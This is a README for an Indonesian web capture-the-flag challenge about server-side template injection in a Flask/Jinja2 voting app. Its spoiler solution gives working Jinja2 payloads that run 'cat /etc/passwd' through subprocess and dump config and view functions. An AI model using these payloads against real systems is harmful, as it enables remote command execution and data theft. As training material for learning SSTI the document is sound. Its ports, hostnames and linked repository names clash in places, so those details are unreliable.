# Voting Dewan Desa: CTF Challenge - SSTI (Server-Side Template Injection)

> Web CTF Challenge | by [ctflabs-id](https://github.com/ctflabs-id)


---

## 📖 Scenario

Sistem voting digital Desa Sukakamu memiliki fitur komentar yang rentan terhadap SSTI. Peserta harus menemukan dan mengeksploitasi kerentanan ini untuk mendapatkan akses ke sistem.

---

## 🎯 Challenge Overview
**Target:** `http://api-ebook-premium.local:4000`<br>
**Vulnerability:** Server-Side Template Injection (SSTI) pada fitur komentar<br>
**Objective:** Eksploitasi kerentanan SSTI untuk membaca file /etc/passwd dan temukan flag tersembunyi.<br>
**Difficulty:** ⭐⭐⭐⭐☆ (Advanced)

---
## 🛠️ Setup Instructions

Prerequisites:

    Python 3.8+
    Flask
    Jinja2
    
Langkah-langkah:

  1. Clone repository ini
```bash
git clone https://github.com/ctflabs-id/Voting-Dewan-CTF
cd Voting-Dewan-CTF
```
  2. Install dependencies
```bash
pip install flask
```
  3. Start Server
```bash
python app.py
```
  4. Server akan berjalan di [http://localhost:4000](http://127.0.0.1:5000)

---

## 💡 Hints
    🔑 Dapatkan token JWT valid terlebih dahulu via endpoint /login
    🧠 Flask menggunakan Jinja2 sebagai template engine
    📚 Pelajari tentang SSTI di Jinja2
    🛠️ Gunakan payload SSTI untuk membaca file atau RCE
    🚩 Flag berada di endpoint tersembunyi

---

## 🎓 Tujuan Tantangan Ini
  1. Memahami kerentanan Server-Side Template Injection
  2. Belajar mengidentifikasi SSTI di Flask/Jinja2
  3. Mempelajari teknik eksploitasi SSTI
  4. Memahami dampak berbahaya dari render template yang tidak aman

---

## ⚠️ Disclaimer

Challenge ini dibuat hanya untuk edukasi dan simulasi keamanan siber. Jangan gunakan teknik serupa terhadap sistem yang tidak kamu miliki atau tidak diizinkan.

---
<details><summary><h2>🏆 Solusi yang Diharapkan - (Spoiler Allert)</h2></summary>

Peserta harus:

Langkah 1: Identifikasi SSTI
  1. Akses http://localhost:5000/comment
  2. Coba input payload sederhana:
```text
{{ 7*7 }}
```
  3. Jika output menampilkan "49", konfirmasi adanya SSTI
Langkah 2: Eksploitasi SSTI
  Gunakan payload untuk membaca file:
```bash
{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}
```
  Atau gunakan payload lebih sederhana:
```bash
{{ config.items() }}
```
Langkah 3: Temukan Flag
  Eksplorasi sistem dengan payload SSTI
  Temukan endpoint admin tersembunyi:
```bash
{{ url_for.__globals__['current_app'].view_functions }}
```
  Akses /admin-secret123 untuk mendapatkan flag
> Flag: CTF_FLAG{SST1_Fl4sk_J1nj4_Un5afe}
</details>

---

## 🤝 Kontribusi Pull request & issue welcome via: ctflabs-id/EBook-Premium-CTF
## 🧠 Maintained by:
```
GitHub: @ctflabs-id
Website: ctflabsid.my.id
```



